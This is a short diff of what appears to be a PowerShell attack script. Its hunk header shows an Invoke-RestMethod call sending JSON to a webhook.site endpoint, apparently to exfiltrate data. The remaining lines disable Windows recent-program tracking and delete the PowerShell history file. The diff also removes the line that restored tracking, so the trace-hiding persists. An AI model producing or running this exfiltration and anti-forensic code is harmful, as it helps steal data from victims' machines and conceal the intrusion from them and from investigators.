@@ -32,5 +32,3 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri https://webhook.site/eb61
 
 Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "Start_TrackProgs" -Value 0
 Remove-Item (Get-PSReadlineOption).HistorySavePath
-Start-Sleep -Seconds 5
-Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "Start_TrackProgs" -Value 1
